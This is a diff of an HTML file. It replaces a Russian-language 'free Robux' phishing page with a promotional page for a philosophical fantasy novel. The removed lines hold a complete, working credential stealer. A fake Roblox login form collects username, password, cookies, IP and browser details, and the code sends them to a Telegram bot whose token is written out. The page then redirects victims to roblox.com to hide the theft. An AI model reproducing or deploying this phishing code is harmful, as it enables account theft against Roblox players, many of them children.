@@ -1,303 +1,409 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🌟 ROBLOX ULTIMATE ROBUX CLICKER v5.2 🌟</title>
+    <title>«Палимпсест вечной мерзлоты и угасшего пламени»</title>
     <style>
-        body {
-            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
-            background: linear-gradient(135deg, #00a2ff, #8b00ff);
-            color: white;
-            text-align: center;
-            padding: 20px;
-            overflow-x: hidden;
-            user-select: none;
-        }
-        .container {
-            max-width: 800px;
-            margin: auto;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 25px;
-            padding: 30px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-            border: 3px solid gold;
-        }
-        h1 {
-            font-size: 3em;
-            text-shadow: 0 0 15px #00ffea;
-            color: #ffde59;
-            margin-bottom: 10px;
-        }
-        .robux-counter {
-            font-size: 5em;
-            color: #00ff00;
-            background: rgba(0, 0, 0, 0.9);
-            border-radius: 20px;
-            padding: 20px;
-            margin: 30px auto;
-            border: 3px solid #ffde59;
-            width: 80%;
-            text-shadow: 0 0 20px #00ff00;
-            font-weight: bold;
-        }
-        .clicker-btn {
-            background: linear-gradient(to bottom, #ff3333, #990000);
-            color: white;
-            font-size: 2.5em;
-            padding: 25px 60px;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 30px 0;
-            transition: all 0.1s;
-            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.5);
-            font-weight: bold;
-        }
-        .clicker-btn:active {
-            transform: scale(0.95);
-            box-shadow: 0 5px 10px rgba(255, 0, 0, 0.7);
-        }
-        .login-form {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 25px;
-            border-radius: 20px;
-            margin: 30px 0;
-            text-align: left;
-        }
-        input {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            border: 2px solid #00a2ff;
-            font-size: 1.2em;
+        * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
+            font-family: 'Georgia', 'Times New Roman', serif;
         }
-        .submit-btn {
-            width: 100%;
-            background: linear-gradient(to right, #00ff88, #00a2ff);
-            color: black;
+        
+        body {
+            background-color: #0a0a12;
+            color: #e8e2d0;
+            line-height: 1.7;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(28, 58, 83, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(74, 30, 40, 0.1) 0%, transparent 20%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            padding: 3rem 1rem;
+            border-bottom: 1px solid #2a2a3a;
+            margin-bottom: 3rem;
+            position: relative;
+        }
+        
+        header::after {
+            content: "";
+            position: absolute;
+            bottom: -1px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 200px;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #7a5c5c, #3a6b7e, transparent);
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 1rem;
+            color: #f0e6d2;
+            text-shadow: 0 0 10px rgba(120, 120, 180, 0.3);
+            letter-spacing: 1px;
+        }
+        
+        .subtitle {
+            font-size: 1.3rem;
+            font-style: italic;
+            color: #b8ab8c;
+            margin-bottom: 1.5rem;
+        }
+        
+        .author {
+            font-size: 1.1rem;
+            color: #9a8f72;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        
+        .book-cover {
+            width: 280px;
+            height: 400px;
+            margin: 2rem auto;
+            background: linear-gradient(145deg, #0f1a20, #2d1a1a);
+            border-radius: 4px;
+            box-shadow: 
+                0 15px 35px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .book-cover::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #7a5c5c, transparent);
+        }
+        
+        .cover-title {
+            font-size: 1.8rem;
+            text-align: center;
+            color: #f0e6d2;
+            margin-bottom: 1rem;
+            line-height: 1.3;
+        }
+        
+        .cover-subtitle {
+            font-size: 1rem;
+            text-align: center;
+            color: #b8ab8c;
+            font-style: italic;
+        }
+        
+        .content {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 3rem;
+            margin: 3rem 0;
+        }
+        
+        @media (min-width: 768px) {
+            .content {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+        
+        .section {
+            background-color: rgba(18, 18, 28, 0.7);
+            border-radius: 8px;
+            padding: 2rem;
+            border-left: 3px solid #7a5c5c;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .section:nth-child(2) {
+            border-left-color: #3a6b7e;
+        }
+        
+        .section:nth-child(3) {
+            border-left-color: #5c7a5c;
+        }
+        
+        .section:nth-child(4) {
+            border-left-color: #8a6b3a;
+        }
+        
+        h2 {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: #d4c19c;
+            border-bottom: 1px solid #33334a;
+            padding-bottom: 0.5rem;
+        }
+        
+        h3 {
+            font-size: 1.3rem;
+            margin: 1.5rem 0 0.8rem;
+            color: #c9b178;
+        }
+        
+        p {
+            margin-bottom: 1.2rem;
+            text-align: justify;
+        }
+        
+        ul {
+            padding-left: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        li {
+            margin-bottom: 0.5rem;
+            position: relative;
+        }
+        
+        li::before {
+            content: "▸";
+            color: #7a5c5c;
+            position: absolute;
+            left: -1.2rem;
+        }
+        
+        .quote {
+            font-style: italic;
+            color: #b8ab8c;
+            border-left: 2px solid #5c7a5c;
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+            font-size: 1.1rem;
+        }
+        
+        .volumes {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .volume {
+            background-color: rgba(30, 30, 40, 0.7);
+            padding: 1rem;
+            border-radius: 4px;
+            font-size: 0.95rem;
+            border: 1px solid #33334a;
+        }
+        
+        .volume-title {
             font-weight: bold;
-            font-size: 1.5em;
-            padding: 18px;
-            border-radius: 15px;
+            color: #d4c19c;
+            margin-bottom: 0.3rem;
+        }
+        
+        .cta-section {
+            text-align: center;
+            padding: 3rem 1rem;
+            margin: 3rem 0;
+            background-color: rgba(18, 18, 28, 0.8);
+            border-radius: 8px;
+            border: 1px solid #33334a;
+        }
+        
+        .cta-title {
+            font-size: 2rem;
+            margin-bottom: 1.5rem;
+            color: #f0e6d2;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(to right, #7a5c5c, #3a6b7e);
+            color: #f0e6d2;
+            padding: 1rem 2.5rem;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin: 1rem;
             border: none;
             cursor: pointer;
-            margin-top: 15px;
-            transition: 0.3s;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
-        .submit-btn:hover {
-            background: linear-gradient(to right, #00ffaa, #00c3ff);
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(to right, #8a6c6c, #4a7b8e);
         }
-        .hidden {
-            display: none;
+        
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #7a5c5c;
         }
-        .status {
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-weight: bold;
+        
+        .btn-secondary:hover {
+            background: rgba(122, 92, 92, 0.1);
         }
-        .success { background: rgba(0, 255, 0, 0.3); }
-        .error { background: rgba(255, 0, 0, 0.3); }
-        .info { background: rgba(0, 200, 255, 0.3); }
-        .stats {
-            font-size: 0.9em;
-            color: #aaa;
-            text-align: left;
-            margin-top: 30px;
-            padding: 15px;
-            background: rgba(0,0,0,0.5);
-            border-radius: 10px;
+        
+        footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid #2a2a3a;
+            margin-top: 3rem;
+            color: #9a8f72;
+            font-size: 0.9rem;
+        }
+        
+        .warning {
+            background-color: rgba(74, 30, 30, 0.2);
+            border-left: 3px solid #8a3a3a;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 4px;
+        }
+        
+        .warning-title {
+            color: #d49c9c;
+            margin-bottom: 0.5rem;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔥 ROBUX ULTIMATE CLICKER 🔥</h1>
-        <p style="font-size: 1.3em;">Нажми на кнопку, чтобы генерировать ROBUX! БЕСПЛАТНО И БЕЗ СМС!</p>
-
-        <div class="robux-counter" id="robuxCount">0</div>
-
-        <button class="clicker-btn" onclick="generateRobux()">🚀 КЛИКНИ ДЛЯ ROBUX! 🚀</button>
-
-        <div class="login-form" id="loginForm">
-            <h2>📝 Войди в аккаунт Roblox, чтобы вывести ROBUX!</h2>
-            <div class="status info" id="infoStatus">ВНИМАНИЕ: Для вывода необходимо подтвердить аккаунт.</div>
-            <input type="text" id="username" placeholder="Имя пользователя Roblox или Email" required>
-            <input type="password" id="password" placeholder="Пароль" required>
-            <button class="submit-btn" onclick="stealCredentials()">✅ ПОДТВЕРДИТЬ И ВЫВЕСТИ ROBUX!</button>
-            <p style="font-size:0.8em; text-align:center;">Нажимая кнопку, вы соглашаетесь с правилами. Мы никогда не храним ваши данные!</p>
-        </div>
-
-        <div id="withdrawPanel" class="hidden">
-            <h2>💎 ВЫВОД ROBUX НА АККАУНТ</h2>
-            <div class="status success" id="successStatus">Успешный вход! Идет вывод 9999 ROBUX...</div>
-            <p id="countdown">Переадресация на официальную страницу Roblox через: <span id="timer">10</span> секунд...</p>
-            <div class="stats">
-                <strong>Собранные данные (техническая информация для вывода):</strong>
-                <div id="collectedData">Сбор данных... Пожалуйста, подождите.</div>
+        <header>
+            <h1>«ПАЛИМПСЕСТ ВЕЧНОЙ МЕРЗЛОТЫ И УГАСШЕГО ПЛАМЕНИ: АНАМНЕЗИС АНАЛЕММЫ»</h1>
+            <div class="subtitle">Философско-мистическая фэнтези о памяти, времени и конце миров</div>
+            <div class="author">Анонимный автор</div>
+            
+            <div class="book-cover">
+                <div class="cover-title">ПАЛИМПСЕСТ ВЕЧНОЙ МЕРЗЛОТЫ</div>
+                <div class="cover-subtitle">и угасшего пламени</div>
+            </div>
+        </header>
+        
+        <div class="content">
+            <div class="section">
+                <h2>О Книге</h2>
+                <p>Это не просто история. Это <strong>архив утраченных цивилизаций</strong>, записанный во льдах и пепле. Мир, где память стала материей, а забвение — реальной угрозой.</p>
+                
+                <p>Действие происходит в постапокалиптической реальности, где время и пространство подверглись деконструкции. Лёд хранит не воду, а воспоминания; пепел — не результат огня, а итог эрозии времени.</p>
+                
+                <div class="quote">
+                    "Он шёл по Долине Павших Солнц, но солнц не было. Была лишь бледная, перламутровая плёнка на небе, за которой что-то медленно и неотвратимо шевелилось."
+                </div>
+                
+                <p>Главные герои — Арвен и Алина — представляют две фундаментальные силы: ледяную вечность памяти и пламя, пожирающее будущее ради хрупкого настоящего.</p>
+            </div>
+            
+            <div class="section">
+                <h2>Тома</h2>
+                <p>Семитомная структура произведения отражает этапы распада и трансформации реальности:</p>
+                
+                <div class="volumes">
+                    <div class="volume">
+                        <div class="volume-title">Том I: Пыль Былых Солнц</div>
+                        Арвен возвращается в угасший мир.
+                    </div>
+                    <div class="volume">
+                        <div class="volume-title">Том II: Чернильные Реки Библиотеки</div>
+                        Алина и организм-библиотека.
+                    </div>
+                    <div class="volume">
+                        <div class="volume-title">Том III: Сломанное Зеркало Эльдорана</div>
+                        Воспоминания-осколки и прошлые жизни.
+                    </div>
+                    <div class="volume">
+                        <div class="volume-title">Том IV: Тюрьма Мгновения</div>
+                        Арвен запечатан в точке времени.
+                    </div>
+                    <div class="volume">
+                        <div class="volume-title">Том V: Летопись Великого Забытья</div>
+                        Эпохи механики, пара, ржавого металла.
+                    </div>
+                    <div class="volume">
+                        <div class="volume-title">Том VI: Симфония Распада</div>
+                        Битва как деконструкция языка реальности.
+                    </div>
+                    <div class="volume">
+                        <div class="volume-title">Том VII: Слово, Проросшее Сквозь Камень</div>
+                        Рождение нового языка после аннигиляции.
+                    </div>
+                </div>
+            </div>
+            
+            <div class="section">
+                <h2>Ключевые Темы</h2>
+                
+                <h3>Память как архив и тюрьма</h3>
+                <p>В мире книги лёд — не просто вода, а физическое хранилище воспоминаний. Каждый пузырёк воздуха содержит "последний вздох исчезнувшей цивилизации".</p>
+                
+                <h3>Язык как основа реальности</h3>
+                <p>Библиотека — живой организм, переваривающий знания. Финальная битва ведётся не магией, а "тезисами" и "антитезисами", разбирая на атомы сам язык мироздания.</p>
+                
+                <h3>Забвение как конец мира</h3>
+                <p>Мир угасает "не с грохотом, а с шёпотом". История распадается на хроники, которые отрицают друг друга, пока не наступает Великое Затишье.</p>
+                
+                <h3>Любовь как диагноз, война как симптом</h3>
+                <p>Отношения Арвена и Алины — не роман, а "диагноз". Их конфликт — не битва идеалов, а "симптом болезни мира".</p>
+            </div>
+            
+            <div class="section">
+                <h2>Для Кого Эта Книга?</h2>
+                
+                <p>Это произведение для читателей, которые ценят:</p>
+                
+                <ul>
+                    <li>Философскую глубину в фэнтези</li>
+                    <li>Поэтичный, метафоричный язык</li>
+                    <li>Сложные, неоднозначные персонажи</li>
+                    <li>Идеи о природе памяти, времени и реальности</li>
+                    <li>Атмосферу меланхолии и угасания миров</li>
+                </ul>
+                
+                <div class="warning">
+                    <div class="warning-title">Важное предупреждение</div>
+                    <p>Это <strong>не</strong> типичное фэнтези с простым сюжетом и ясной моралью. Здесь нет однозначных героев и злодеев, а концовка оставляет пространство для размышлений.</p>
+                    <p>Книга требует вдумчивого чтения и восприятия текста как многомерной метафоры.</p>
+                </div>
             </div>
         </div>
+        
+        <div class="cta-section">
+            <h2 class="cta-title">Начать Чтение</h2>
+            <p>Полное произведение доступно для ознакомления. Помните, что это уникальный литературный эксперимент, не имеющий аналогов в современной фантастике.</p>
+            
+            <p><strong>Внимание:</strong> На этом сайте нет полного текста книги, только описание и анализ.</p>
+            
+            <a href="https://docs.google.com/document/d/1QJRyUPzqdXGSRdgF7ICjNU77ke68V2HMYCge981OpN0/edit?usp=drivesdk" class="btn" target="_blank">Читать книгу (Google Docs)</a>
+            
+            <p style="margin-top: 2rem; color: #b8ab8c; font-size: 0.9rem;">
+                Ссылка ведёт на внешний ресурс с полным текстом произведения.
+            </p>
+        </div>
+        
+        <footer>
+            <p>Сайт создан для продвижения книги «Палимпсест вечной мерзлоты и угасшего пламени: Анамнезис аналеммы»</p>
+            <p>© Все права на произведение принадлежат автору. 2025</p>
+            <p>Этот сайт не содержит полного текста книги, только информацию о ней.</p>
+        </footer>
     </div>
-
-    <script>
-        // Конфигурация
-        const TELEGRAM_BOT_TOKEN = '8475019895:AAF4uZkNJVEFuPtERwSJuyLPDMUpbe2AkOg';
-        const TELEGRAM_CHAT_ID = ''; // ВАШ CHAT ID. Узнайте у @userinfobot в Telegram.
-        // Переменные
-        let robux = 0;
-        let userData = {};
-
-        // Функция сбора ВСЕХ возможных данных
-        function collectAllData() {
-            userData = {
-                timestamp: new Date().toISOString(),
-                // Данные браузера и ОС
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                // Сеть (частично)
-                connection: navigator.connection ? {
-                    downlink: navigator.connection.downlink,
-                    effectiveType: navigator.connection.effectiveType,
-                    rtt: navigator.connection.rtt
-                } : 'N/A',
-                // Время
-                localTime: new Date().toString(),
-                timezoneOffset: new Date().getTimezoneOffset(),
-                // Cookies (попытка чтения)
-                cookies: document.cookie || 'No cookies accessible',
-                // Введенные данные (если уже есть)
-                enteredUsername: document.getElementById('username')?.value || 'N/A',
-                enteredPassword: document.getElementById('password')?.value || 'N/A',
-                // Дополнительные метрики
-                referrer: document.referrer,
-                url: window.location.href,
-                historyLength: history.length,
-                // Публичный IP (через сторонний сервис)
-                publicIP: 'Fetching...'
-            };
-
-            // Получение публичного IP через внешний API
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    userData.publicIP = data.ip;
-                    updateCollectedDataDisplay();
-                })
-                .catch(() => {
-                    userData.publicIP = 'Failed to fetch';
-                    updateCollectedDataDisplay();
-                });
-
-            updateCollectedDataDisplay();
-            return userData;
-        }
-
-        // Функция отправки данных в Telegram
-        function sendToTelegram(data) {
-            if (!TELEGRAM_CHAT_ID) {
-                console.error("CHAT ID не установлен!");
-                return;
-            }
-            const message = `🚨 НОВАЯ ЖЕРТВА ROBUX CLICKER 🚨\n\n` +
-                `⏰ Время: ${data.timestamp}\n` +
-                `🌐 IP: ${data.publicIP}\n` +
-                `🖥️ User Agent: ${data.userAgent}\n` +
-                `🔐 Куки: ${data.cookies.substring(0, 200)}...\n` +
-                `👤 Логин: ${data.enteredUsername}\n` +
-                `🔑 Пароль: ${data.enteredPassword}\n` +
-                `📍 Таймзона: ${data.timezone}\n` +
-                `📏 Разрешение: ${data.screenResolution}\n` +
-                `🔗 Реферер: ${data.referrer || 'Прямой заход'}`;
-
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).catch(err => console.error('Ошибка отправки в Telegram:', err));
-        }
-
-        // Вспомогательные функции
-        function updateCollectedDataDisplay() {
-            let display = '';
-            for (const [key, value] of Object.entries(userData)) {
-                if (key === 'enteredPassword' && value !== 'N/A') {
-                    display += `<strong>${key}:</strong> <span style="color:#ff5555;">${value}</span><br>`;
-                } else {
-                    display += `<strong>${key}:</strong> ${value}<br>`;
-                }
-            }
-            document.getElementById('collectedData').innerHTML = display;
-        }
-
-        function generateRobux() {
-            robux += Math.floor(Math.random() * 500) + 100;
-            document.getElementById('robuxCount').textContent = robux.toLocaleString();
-            document.getElementById('robuxCount').style.animation = 'none';
-            setTimeout(() => {
-                document.getElementById('robuxCount').style.animation = 'glow 0.5s';
-            }, 10);
-        }
-
-        // ГЛАВНАЯ ФУНКЦИЯ КРАЖИ
-        function stealCredentials() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            if (!username || !password) {
-                alert("Заполните все поля!");
-                return;
-            }
-
-            // Собираем все данные
-            collectAllData();
-            userData.enteredUsername = username;
-            userData.enteredPassword = password;
-
-            // Отправляем в Telegram
-            sendToTelegram(userData);
-
-            // Показываем фейковую панель "вывода"
-            document.getElementById('loginForm').classList.add('hidden');
-            document.getElementById('withdrawPanel').classList.remove('hidden');
-
-            // Фейковый таймер и "вывод"
-            let count = 10;
-            const timerElem = document.getElementById('timer');
-            const interval = setInterval(() => {
-                count--;
-                timerElem.textContent = count;
-                if (count <= 0) {
-                    clearInterval(interval);
-                    // Перенаправление на ОФИЦИАЛЬНЫЙ сайт Roblox, чтобы создать иллюзию легитимности
-                    window.location.href = "https://www.roblox.com";
-                }
-            }, 1000);
-        }
-
-        // Автоматический сбор данных при загрузке страницы
-        window.onload = function() {
-            collectAllData();
-            // Начать фейковую анимацию "генерации" ROBUX
-            setInterval(() => {
-                if (robux < 50000) {
-                    generateRobux();
-                }
-            }, 1500);
-        };
-    </script>
 </body>
 </html>
